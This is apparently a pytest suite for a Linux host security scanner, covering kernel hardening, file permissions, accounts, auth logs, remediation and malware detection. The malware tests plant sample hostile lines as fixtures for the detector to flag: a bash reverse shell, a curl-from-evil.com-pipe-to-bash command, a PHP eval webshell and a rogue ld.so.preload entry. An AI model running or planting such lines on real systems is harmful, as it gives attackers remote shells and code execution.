    def test_empty_output(self):
        sec, other = ec._parse_dnf_check_update("")
        assert sec == [] and other == []


class TestCheckPackages:
    def _run(self, monkeypatch, apt_present, stdout, returncode=0):
        if apt_present:
            monkeypatch.setattr(shutil, "which", lambda x: "/usr/bin/apt" if x == "apt" else None)
        else:
            monkeypatch.setattr(shutil, "which", lambda x: "/usr/bin/dnf" if x == "dnf" else None)

        import subprocess as sp
        fake = sp.CompletedProcess(args=[], returncode=returncode, stdout=stdout, stderr="")
        monkeypatch.setattr(sp, "run", lambda *a, **kw: fake)

        r = FakeReporter()
        ec.check_packages(r)
        return r

    def test_all_up_to_date(self, monkeypatch):
        r = self._run(monkeypatch, apt_present=True, stdout="Listing... Done\n")
        assert r.oks
        assert not r.findings

    def test_security_update_critical(self, monkeypatch):
        stdout = (
            "Listing... Done\n"
            "libssl3/focal-security 3.0.2 amd64 [upgradeable from: 3.0.1]\n"
        )
        r = self._run(monkeypatch, apt_present=True, stdout=stdout)
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_non_security_update_medium(self, monkeypatch):
        stdout = "vim/focal 2:8.2 amd64 [upgradeable from: 2:8.1]\n"
        r = self._run(monkeypatch, apt_present=True, stdout=stdout)
        assert any(f["severity"] == "MEDIUM" for f in r.findings)
        assert not any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_no_package_manager(self, monkeypatch):
        monkeypatch.setattr(shutil, "which", lambda x: None)
        r = FakeReporter()
        ec.check_packages(r)
        assert r.infos

    def test_timeout_handled(self, monkeypatch):
        monkeypatch.setattr(shutil, "which", lambda x: "/usr/bin/apt" if x == "apt" else None)
        import subprocess as sp
        def raise_timeout(*a, **kw):
            raise sp.TimeoutExpired(cmd="apt", timeout=60)
        monkeypatch.setattr(sp, "run", raise_timeout)
        r = FakeReporter()
        ec.check_packages(r)
        assert r.errors

    def test_dnf_security_update(self, monkeypatch):
        stdout = "bash.x86_64  5.1.8-9.el9  security\n"
        r = self._run(monkeypatch, apt_present=False, stdout=stdout)
        assert any(f["severity"] == "CRITICAL" for f in r.findings)


# ── check_kernel_hardening ────────────────────────────────────────────────────

class TestReadSysctl:
    def test_reads_existing_key(self, tmp_path, monkeypatch):
        key = "kernel.randomize_va_space"
        proc = tmp_path / "sys" / "kernel" / "randomize_va_space"
        proc.parent.mkdir(parents=True)
        proc.write_text("2\n")
        monkeypatch.setattr(ec.os.path, "join",
                            lambda *a: str(tmp_path / "sys" / "/".join(a[1:])))
        # Easier: monkeypatch open via _read_sysctl internals — just test directly
        # by pointing at a real file path trick is complex; test via check_kernel_hardening instead.
        val, err = ec._read_sysctl.__wrapped__(key) if hasattr(ec._read_sysctl, "__wrapped__") else (None, None)

    def test_missing_key_returns_not_found(self, tmp_path):
        val, err = ec._read_sysctl("kernel.nonexistent_key_xyzzy")
        assert val is None
        assert err == "not found"


class TestCheckKernelHardening:
    def _run_with_values(self, monkeypatch, sysctl_map):
        """Run check_kernel_hardening with a dict of key→value overrides."""
        def fake_read(key):
            if key in sysctl_map:
                return sysctl_map[key], None
            return None, "not found"
        monkeypatch.setattr(ec.checks.security, "_read_sysctl", fake_read)
        monkeypatch.setattr(ec.os.path, "isdir", lambda p: True)
        r = FakeReporter()
        ec.check_kernel_hardening(r)
        return r

    def test_all_good_values(self, monkeypatch):
        good = {
            "kernel.randomize_va_space":            "2",
            "net.ipv4.tcp_syncookies":              "1",
            "fs.suid_dumpable":                     "0",
            "net.ipv4.ip_forward":                  "0",
            "kernel.dmesg_restrict":                "1",
            "kernel.kptr_restrict":                 "1",
            "net.ipv4.conf.all.accept_redirects":   "0",
            "net.ipv6.conf.all.accept_redirects":   "0",
            "net.ipv4.conf.all.send_redirects":     "0",
            "net.ipv4.conf.all.rp_filter":          "1",
        }
        r = self._run_with_values(monkeypatch, good)
        assert r.findings == []
        assert r.oks

    def test_aslr_disabled_critical(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {"kernel.randomize_va_space": "0"})
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_aslr_partial_high(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {"kernel.randomize_va_space": "1"})
        assert any(f["severity"] == "HIGH" for f in r.findings)

    def test_syncookies_disabled_high(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {"net.ipv4.tcp_syncookies": "0"})
        assert any(f["severity"] == "HIGH" for f in r.findings)

    def test_ip_forward_enabled_high(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {"net.ipv4.ip_forward": "1"})
        assert any(f["severity"] == "HIGH" for f in r.findings)

    def test_dmesg_unrestricted_medium(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {"kernel.dmesg_restrict": "0"})
        assert any(f["severity"] == "MEDIUM" for f in r.findings)

    def test_accept_redirects_medium(self, monkeypatch):
        r = self._run_with_values(
            monkeypatch, {"net.ipv4.conf.all.accept_redirects": "1"}
        )
        assert any(f["severity"] == "MEDIUM" for f in r.findings)

    def test_no_proc_sys_skips(self, monkeypatch):
        monkeypatch.setattr(ec.os.path, "isdir", lambda p: False)
        r = FakeReporter()
        ec.check_kernel_hardening(r)
        assert r.infos
        assert r.findings == []

    def test_findings_sorted_by_severity(self, monkeypatch):
        r = self._run_with_values(monkeypatch, {
            "kernel.dmesg_restrict":       "0",  # MEDIUM
            "kernel.randomize_va_space":   "0",  # CRITICAL
            "net.ipv4.tcp_syncookies":     "0",  # HIGH
        })
        sevs = [f["severity"] for f in r.findings]
        assert sevs == sorted(sevs, key=lambda s: ec.SEVERITY_ORDER.get(s, 9))


# ── check_sensitive_perms ─────────────────────────────────────────────────────

class TestCheckSensitivePerms:
    def _make_file(self, tmp_path, name, mode):
        p = tmp_path / name
        p.write_text("data")
        p.chmod(mode)
        return str(p)

    def test_world_readable_shadow_critical(self, tmp_path):
        path = self._make_file(tmp_path, "shadow", 0o644)  # world-readable
        rules = [(path, 0o004, "CRITICAL", "shadow world-readable", "why", "fix", ["chmod 640 /etc/shadow"])]
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=rules, ssh_key_glob="/nonexistent/glob_*")
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_correct_permissions_ok(self, tmp_path):
        path = self._make_file(tmp_path, "shadow", 0o640)  # group-readable only
        rules = [(path, 0o004, "CRITICAL", "shadow world-readable", "why", "fix", ["chmod 640 /etc/shadow"])]
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=rules, ssh_key_glob="/nonexistent/glob_*")
        assert r.findings == []
        assert r.oks

    def test_missing_file_skipped(self, tmp_path):
        rules = [("/nonexistent/shadow", 0o004, "CRITICAL", "lbl", "why", "fix", [])]
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=rules, ssh_key_glob="/nonexistent/glob_*")
        assert r.findings == []

    def test_ssh_key_group_readable_critical(self, tmp_path):
        key = tmp_path / "ssh_host_rsa_key"
        key.write_text("PRIVATE KEY")
        key.chmod(0o640)  # group-readable
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=[], ssh_key_glob=str(tmp_path / "ssh_host_*_key"))
        assert any(f["severity"] == "CRITICAL" for f in r.findings)
        assert "ssh_host_rsa_key" in r.findings[0]["label"]

    def test_ssh_key_correct_mode_ok(self, tmp_path):
        key = tmp_path / "ssh_host_ed25519_key"
        key.write_text("PRIVATE KEY")
        key.chmod(0o600)
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=[], ssh_key_glob=str(tmp_path / "ssh_host_*_key"))
        assert r.findings == []

    def test_findings_sorted_by_severity(self, tmp_path):
        f1 = self._make_file(tmp_path, "f1", 0o006)  # world-readable+writable
        f2 = self._make_file(tmp_path, "f2", 0o006)
        rules = [
            (f1, 0o004, "MEDIUM", "medium finding", "w", "f", []),
            (f2, 0o004, "CRITICAL", "critical finding", "w", "f", []),
        ]
        r = FakeReporter()
        ec.check_sensitive_perms(r, rules=rules, ssh_key_glob="/nonexistent/glob_*")
        sevs = [f["severity"] for f in r.findings]
        assert sevs == sorted(sevs, key=lambda s: ec.SEVERITY_ORDER.get(s, 9))


# ── check_user_accounts ───────────────────────────────────────────────────────

class TestCheckUserAccounts:
    def _run(self, monkeypatch, passwd_lines, shadow_lines=None):
        def fake_open(path, *a, **kw):
            import io
            if "passwd" in path:
                return io.StringIO("\n".join(passwd_lines))
            if "shadow" in path:
                if shadow_lines is None:
                    raise PermissionError("not root")
                return io.StringIO("\n".join(shadow_lines))
            raise FileNotFoundError(path)
        monkeypatch.setattr("builtins.open", fake_open)
        r = FakeReporter()
        ec.check_user_accounts(r)
        return r

    def test_extra_uid0_critical(self, monkeypatch):
        r = self._run(monkeypatch, [
            "root:x:0:0:root:/root:/bin/bash",
            "backdoor:x:0:0::/home/bd:/bin/sh",
        ])
        assert any("backdoor" in f["label"] for f in r.findings)
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_normal_accounts_ok(self, monkeypatch):
        r = self._run(monkeypatch, [
            "root:x:0:0:root:/root:/bin/bash",
            "alice:x:1000:1000::/home/alice:/bin/bash",
        ])
        assert r.findings == []
        assert r.oks

    def test_empty_password_critical(self, monkeypatch):
        r = self._run(monkeypatch,
                      passwd_lines=["root:x:0:0:root:/root:/bin/bash",
                                    "alice:x:1000:1000::/home/alice:/bin/bash"],
                      shadow_lines=["root:$6$hash:19000:0:99999:7:::",
                                    "alice::19000:0:99999:7:::"])  # empty hash
        assert any("alice" in f["label"] for f in r.findings)
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_shadow_permission_error_ignored(self, monkeypatch):
        r = self._run(monkeypatch,
                      passwd_lines=["root:x:0:0:root:/root:/bin/bash"],
                      shadow_lines=None)  # triggers PermissionError
        assert r.findings == []
        assert not r.errors  # should not surface as an error

    def test_passwd_unreadable_error(self, monkeypatch):
        def fake_open(path, *a, **kw):
            raise OSError("no permission")
        monkeypatch.setattr("builtins.open", fake_open)
        r = FakeReporter()
        ec.check_user_accounts(r)
        assert r.errors


# ── check_docker_socket ───────────────────────────────────────────────────────

class TestCheckDockerSocket:
    def test_absent_socket_ok(self, tmp_path):
        r = FakeReporter()
        ec.check_docker_socket(r, sock_path=str(tmp_path / "nonexistent.sock"))
        assert r.oks
        assert not r.findings

    def test_world_writable_critical(self, tmp_path):
        sock = tmp_path / "docker.sock"
        sock.write_text("")
        sock.chmod(0o777)
        r = FakeReporter()
        ec.check_docker_socket(r, sock_path=str(sock))
        assert any(f["severity"] == "CRITICAL" for f in r.findings)

    def test_world_readable_high(self, tmp_path):
        sock = tmp_path / "docker.sock"
        sock.write_text("")
        sock.chmod(0o664)  # group+world readable, not world writable... wait 664 = rw-rw-r--
        # world-readable bit is 0o004, 0o664 & 0o004 = 0o004 ✓, 0o664 & 0o002 = 0 ✓
        r = FakeReporter()
        ec.check_docker_socket(r, sock_path=str(sock))
        assert any(f["severity"] == "HIGH" for f in r.findings)

    def test_correct_permissions_ok(self, tmp_path):
        sock = tmp_path / "docker.sock"
        sock.write_text("")
        sock.chmod(0o660)  # rw-rw---- — group accessible only
        r = FakeReporter()
        ec.check_docker_socket(r, sock_path=str(sock))
        assert r.oks
        assert not r.findings


# ── remediate ─────────────────────────────────────────────────────────────────

def _report_with_fixable(tmp_path):
    """Write a report with one fixable finding and return its path."""
    data = {
        "timestamp": "2026-01-01T00:00:00+00:00",
        "checks": [{
            "check": "KERNEL HARDENING",
            "findings": [{
                "severity": "HIGH",
                "label": "SYN-flood protection disabled",
                "why": "why",
                "fix": "set it",
                "fix_cmds": ["sysctl -w net.ipv4.tcp_syncookies=1"],
            }],
        }],
    }
    p = tmp_path / "report.json"
    p.write_text(json.dumps(data))
    return str(p), data


class TestCollectFixable:
    def test_finds_fixable_findings(self, tmp_path):
        _, data = _report_with_fixable(tmp_path)
        items = ec._collect_fixable(data)
        assert len(items) == 1
        assert items[0]["fix_cmds"] == ["sysctl -w net.ipv4.tcp_syncookies=1"]
        assert items[0]["severity"] == "HIGH"

    def test_skips_findings_without_fix_cmds(self):
        data = {"checks": [{"check": "PORT SCAN", "findings": [
            {"severity": "CRITICAL", "label": "lbl", "why": "w", "fix": "f", "fix_cmds": []},
        ]}]}
        assert ec._collect_fixable(data) == []

    def test_empty_report(self):
        assert ec._collect_fixable({"checks": []}) == []


class TestRemediateMain:
    def test_dry_run_shows_menu_no_execution(self, tmp_path, capsys, monkeypatch):
        path, _ = _report_with_fixable(tmp_path)
        executed = []
        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
        ec._remediate_main([path, "--dry-run"])
        assert executed == []
        out = capsys.readouterr().out
        assert "sysctl -w" in out

    def test_all_yes_executes_all(self, tmp_path, monkeypatch):
        path, _ = _report_with_fixable(tmp_path)
        executed = []
        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
        # The re-validation scan vouches for the report's command.
        monkeypatch.setattr(ec._remediate, "_live_fix_cmds",
                            lambda: {"sysctl -w net.ipv4.tcp_syncookies=1"})
        ec._remediate_main([path, "--all", "--yes"])
        assert "sysctl -w net.ipv4.tcp_syncookies=1" in executed

    def test_item_flag_runs_specific(self, tmp_path, monkeypatch):
        data = {
            "timestamp": "2026-01-01T00:00:00+00:00",
            "checks": [{"check": "C", "findings": [
                {"severity": "HIGH", "label": "A", "why": "w", "fix": "f",
                 "fix_cmds": ["cmd_a"]},
                {"severity": "HIGH", "label": "B", "why": "w", "fix": "f",
                 "fix_cmds": ["cmd_b"]},
            ]}],
        }
        p = tmp_path / "r.json"
        p.write_text(json.dumps(data))
        executed = []
        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: executed.append(cmd) or (0, ""))
        monkeypatch.setattr(ec._remediate, "_live_fix_cmds", lambda: {"cmd_a", "cmd_b"})
        ec._remediate_main([str(p), "--item", "2", "--yes"])
        assert executed == ["cmd_b"]
        assert "cmd_a" not in executed

    def test_failed_command_exits_1(self, tmp_path, monkeypatch):
        path, _ = _report_with_fixable(tmp_path)
        monkeypatch.setattr(ec._remediate, "_run_fix_cmd", lambda cmd: (1, "permission denied"))
        monkeypatch.setattr(ec._remediate, "_live_fix_cmds",
                            lambda: {"sysctl -w net.ipv4.tcp_syncookies=1"})
        with pytest.raises(SystemExit) as exc:
            ec._remediate_main([path, "--all", "--yes"])
        assert exc.value.code == 1

    def test_missing_report_exits(self, tmp_path):
        with pytest.raises(SystemExit):
            ec._remediate_main([str(tmp_path / "nope.json")])

    def test_out_of_range_item_exits(self, tmp_path):
        path, _ = _report_with_fixable(tmp_path)
        with pytest.raises(SystemExit):
            ec._remediate_main([path, "--item", "99"])

    def test_no_fixable_findings_shows_message(self, tmp_path, capsys):
        data = {"timestamp": "t", "checks": [{"check": "X", "findings": [
            {"severity": "HIGH", "label": "lbl", "why": "w", "fix": "f", "fix_cmds": []},
        ]}]}
        p = tmp_path / "r.json"
        p.write_text(json.dumps(data))
        ec._remediate_main([str(p), "--dry-run"])
        out = capsys.readouterr().out
        assert "No findings with automated fixes" in out


# ── _compute_score ──────────────────────────────────────────────────────────────

def _report_with_severities(*severities):
    # Findings carry a non-empty fix_cmds: only actionable (fixable) findings
    # deduct from the score — unfixable/informational ones are shown but never
    # penalise the user. See test_unfixable_finding_does_not_deduct.
    findings = [{"severity": s, "label": s, "why": "", "fix": "",
                 "fix_cmds": ["echo fix"]}
                for s in severities]
    return {"timestamp": "t", "checks": [{"check": "X", "findings": findings}]}


class TestComputeScore:
    def test_clean_scan_is_100_grade_a(self):
        score, grade = ec._compute_score({"checks": []})
        assert score == 100
        assert grade == "A"

    def test_single_critical_deducts_25(self):
        score, grade = ec._compute_score(_report_with_severities("CRITICAL"))
        assert score == 75
        assert grade == "B"

    def test_four_criticals_floors_at_zero(self):
        score, grade = ec._compute_score(_report_with_severities(*["CRITICAL"] * 4))
        assert score == 0
        assert grade == "F"

    def test_mixed_severities(self):
        # CRITICAL(-25) + HIGH(-10) + MEDIUM(-3) = -38 → 62 → grade C
        score, grade = ec._compute_score(
            _report_with_severities("CRITICAL", "HIGH", "MEDIUM")
        )
        assert score == 62
        assert grade == "C"

    def test_grade_boundaries(self):
        # Each grade band
        for n_high, expected_grade in [(0, "A"), (2, "B"), (5, "C"), (7, "D"), (10, "F")]:
            score, grade = ec._compute_score(_report_with_severities(*["HIGH"] * n_high))
            assert grade == expected_grade, f"{n_high} HIGH → score {score} expected {expected_grade}"

    def test_review_deducts_1(self):
        score, _ = ec._compute_score(_report_with_severities("REVIEW"))
        assert score == 99

    def test_unfixable_finding_does_not_deduct(self):
        # A CRITICAL with no fix_cmds is informational from the score's view:
        # the user can't one-click fix it, so it must not lower their grade.
        data = {"checks": [{"check": "X", "findings": [
            {"severity": "CRITICAL", "label": "c", "why": "", "fix": "", "fix_cmds": []},
        ]}]}
        score, grade = ec._compute_score(data)
        assert score == 100
        assert grade == "A"

    def test_info_deducts_nothing(self):
        score, _ = ec._compute_score(_report_with_severities("INFO"))
        assert score == 100

    def test_unknown_severity_deducts_nothing(self):
        score, _ = ec._compute_score(_report_with_severities("UNKNOWN"))
        assert score == 100


class TestRenderHtml:
    def test_returns_valid_html_string(self):
        data = _report_with_severities("CRITICAL", "HIGH")
        html = ec._render_html(data)
        assert html.startswith("<!DOCTYPE html>")
        assert "<title>" in html
        assert "CRITICAL" in html

    def test_score_and_grade_present(self):
        data = _report_with_severities("CRITICAL")  # score 75, grade B
        html = ec._render_html(data)
        assert ">75<" in html
        assert ">B<" in html

    def test_no_findings_shows_clean_message(self):
        html = ec._render_html({"checks": []})
        assert "Clean scan" in html or "No findings" in html

    def test_fix_cmds_rendered(self):
        data = {"checks": [{"check": "test", "findings": [{
            "severity": "HIGH", "label": "lbl", "why": "w",
            "fix": "f", "fix_cmds": ["sudo sysctl -w foo=1"],
        }]}]}
        html = ec._render_html(data)
        assert "sudo sysctl -w foo=1" in html


# ── check_auth_log ─────────────────────────────────────────────────────────────

def _write_auth_log(tmp_path, lines):
    p = tmp_path / "auth.log"
    p.write_text("\n".join(lines) + "\n")
    return str(p)


class TestCheckAuthLog:
    def test_no_log_files_reports_info(self):
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[])
        assert not r.findings
        assert any("No auth log" in m for m in r.infos)

    @pytest.mark.skipif(hasattr(os, "geteuid") and os.geteuid() == 0,
                        reason="root bypasses file permissions")
    def test_permission_error_reports_error(self, tmp_path):
        log = tmp_path / "auth.log"
        log.write_text("x")
        log.chmod(0o000)
        r = FakeReporter()
        try:
            ec.check_auth_log(r, log_paths=[str(log)])
            assert r.errors
        finally:
            log.chmod(0o644)

    def test_clean_log_reports_ok(self, tmp_path):
        log = _write_auth_log(tmp_path, [
            "Jun 10 06:00:01 host sshd[123]: Accepted publickey for liam from 192.168.1.1 port 55000 ssh2",
        ])
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        assert not r.findings
        assert r.oks

    def test_high_volume_failures_reported_high(self, tmp_path):
        lines = [
            f"Jun 10 06:00:0{i % 9} host sshd[1]: Failed password for root from 1.2.3.4 port {50000 + i} ssh2"
            for i in range(600)
        ]
        log = _write_auth_log(tmp_path, lines)
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        sevs = [f["severity"] for f in r.findings]
        assert "HIGH" in sevs

    def test_medium_volume_failures_reported_medium(self, tmp_path):
        lines = [
            f"Jun 10 06:00:01 host sshd[1]: Failed password for admin from 5.6.7.8 port {50000 + i} ssh2"
            for i in range(75)
        ]
        log = _write_auth_log(tmp_path, lines)
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        sevs = [f["severity"] for f in r.findings]
        assert "MEDIUM" in sevs
        assert "HIGH" not in sevs

    def test_root_failures_separate_finding(self, tmp_path):
        lines = [
            f"Jun 10 06:00:01 host sshd[1]: Failed password for root from 9.9.9.9 port {50000 + i} ssh2"
            for i in range(15)
        ]
        log = _write_auth_log(tmp_path, lines)
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        labels = [f["label"] for f in r.findings]
        assert any("root" in l.lower() for l in labels)
        root_finding = next(f for f in r.findings if "root" in f["label"].lower())
        assert root_finding["severity"] == "HIGH"

    def test_sudo_failures_reported_review(self, tmp_path):
        lines = [
            "Jun 10 06:00:01 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob",
            "Jun 10 06:00:02 host sudo: pam_unix(sudo:auth): authentication failure; logname=bob",
        ]
        log = _write_auth_log(tmp_path, lines)
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        sevs = [f["severity"] for f in r.findings]
        assert "REVIEW" in sevs

    def test_invalid_user_attempts_count_toward_total(self, tmp_path):
        lines = [
            f"Jun 10 06:00:01 host sshd[1]: Invalid user scanner from 3.3.3.3 port {50000 + i}"
            for i in range(60)
        ]
        log = _write_auth_log(tmp_path, lines)
        r = FakeReporter()
        ec.check_auth_log(r, log_paths=[log])
        assert any(f["severity"] in ("MEDIUM", "HIGH") for f in r.findings)


# ── check_malware ──────────────────────────────────────────────────────────────

class TestAvTempExecutables:
    def test_no_executables_no_finding(self, tmp_path):
        f = tmp_path / "plain.txt"
        f.write_text("hello")
        f.chmod(0o644)
        r = FakeReporter()
        ec._av_check_temp_executables.__globals__["_AV_TEMP_DIRS"]  # exists
        # pass an empty set of dirs — no findings expected
        orig = ec.checks.security._AV_TEMP_DIRS
        ec.checks.security._AV_TEMP_DIRS = []
        try:
            ec._av_check_temp_executables(r)
        finally:
            ec.checks.security._AV_TEMP_DIRS = orig
        assert not r.findings

    def test_executable_in_tmp_reported(self, tmp_path):
        exe = tmp_path / "evil.sh"
        exe.write_text("#!/bin/bash\necho x")
        exe.chmod(0o755)
        orig = ec.checks.security._AV_TEMP_DIRS
        ec.checks.security._AV_TEMP_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_check_temp_executables(r)
            assert len(r.findings) == 1
            assert r.findings[0]["severity"] == "HIGH"
        finally:
            ec.checks.security._AV_TEMP_DIRS = orig


class TestAvSuspiciousProcs:
    def test_no_deleted_procs(self, monkeypatch):
        # Patch os.scandir to return a pid entry whose /proc/<pid>/exe
        # points to a normal path.
        entries = []
        r = FakeReporter()
        monkeypatch.setattr(os, "scandir", lambda _: iter(entries))
        ec._av_check_suspicious_procs(r)
        assert not r.findings


class TestAvLdPreload:
    def test_absent_no_finding(self, tmp_path):
        r = FakeReporter()
        # point at non-existent file
        import unittest.mock as mock
        with mock.patch("os.path.exists", return_value=False):
            ec._av_check_ld_preload(r)
        assert not r.findings

    def test_present_with_content_is_critical(self, tmp_path):
        preload = tmp_path / "ld.so.preload"
        preload.write_text("/lib/evil.so\n")
        orig = ec._av_check_ld_preload
        # Temporarily redirect the hardcoded path
        import unittest.mock as mock
        with mock.patch("builtins.open", mock.mock_open(read_data="/lib/evil.so\n")):
            with mock.patch("os.path.exists", return_value=True):
                r = FakeReporter()
                ec._av_check_ld_preload(r)
        assert r.findings
        assert r.findings[0]["severity"] == "CRITICAL"


class TestAvScanScripts:
    def test_clean_script_no_finding(self, tmp_path):
        s = tmp_path / "clean.sh"
        s.write_text("#!/bin/bash\necho hello\n")
        orig = ec.checks.security._AV_SCRIPT_DIRS
        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_scan_scripts(r)
            assert not r.findings
        finally:
            ec.checks.security._AV_SCRIPT_DIRS = orig

    def test_reverse_shell_detected(self, tmp_path):
        s = tmp_path / "cron_job.sh"
        s.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        orig = ec.checks.security._AV_SCRIPT_DIRS
        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_scan_scripts(r)
            assert r.findings
            assert r.findings[0]["severity"] == "HIGH"
            assert "reverse shell" in r.findings[0]["label"].lower()
        finally:
            ec.checks.security._AV_SCRIPT_DIRS = orig

    def test_curl_pipe_bash_detected(self, tmp_path):
        s = tmp_path / "deploy.sh"
        s.write_text("curl http://evil.com/payload.sh | bash\n")
        orig = ec.checks.security._AV_SCRIPT_DIRS
        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_scan_scripts(r)
            assert r.findings
            assert "download-execute" in r.findings[0]["label"].lower()
        finally:
            ec.checks.security._AV_SCRIPT_DIRS = orig

    def test_php_webshell_detected(self, tmp_path):
        s = tmp_path / "shell.php"
        s.write_bytes(b"<?php eval($_POST['cmd']); ?>")
        orig = ec.checks.security._AV_SCRIPT_DIRS
        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_scan_scripts(r)
            assert r.findings
            assert "webshell" in r.findings[0]["label"].lower()
        finally:
            ec.checks.security._AV_SCRIPT_DIRS = orig

    def test_file_too_large_skipped(self, tmp_path):
        s = tmp_path / "big.sh"
        s.write_bytes(b"curl http://evil.com/x | bash\n" * 50_000)  # ~1.4 MB
        orig = ec.checks.security._AV_SCRIPT_DIRS
        ec.checks.security._AV_SCRIPT_DIRS = [str(tmp_path)]
        try:
            r = FakeReporter()
            ec._av_scan_scripts(r)
            assert not r.findings  # skipped because > 512 KB
        finally:
            ec.checks.security._AV_SCRIPT_DIRS = orig


class TestCheckMalware:
    def test_clean_system_reports_ok(self, monkeypatch):
        monkeypatch.setattr(ec.checks.security, "_av_run_clamav",          lambda r, p: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_temp_executables", lambda r: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_suspicious_procs", lambda r: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_ld_preload",       lambda r: 0)
        monkeypatch.setattr(ec.checks.security, "_av_scan_scripts",           lambda r: 0)
        r = FakeReporter()
        ec.check_malware(r)
        assert not r.findings
        assert r.oks

    def test_findings_from_sublayers_bubble_up(self, monkeypatch):
        monkeypatch.setattr(ec.checks.security, "_av_run_clamav",          lambda r, p: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_temp_executables", lambda r: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_suspicious_procs", lambda r: 0)
        monkeypatch.setattr(ec.checks.security, "_av_check_ld_preload",       lambda r: 0)
        def _fake_scripts(r):
            r.finding("HIGH", "Suspicious pattern in cron.sh: reverse shell (bash/TCP)",
                      "why", "fix")
            return 1
        monkeypatch.setattr(ec.checks.security, "_av_scan_scripts", _fake_scripts)
        r = FakeReporter()
        ec.check_malware(r)
        assert len(r.findings) == 1
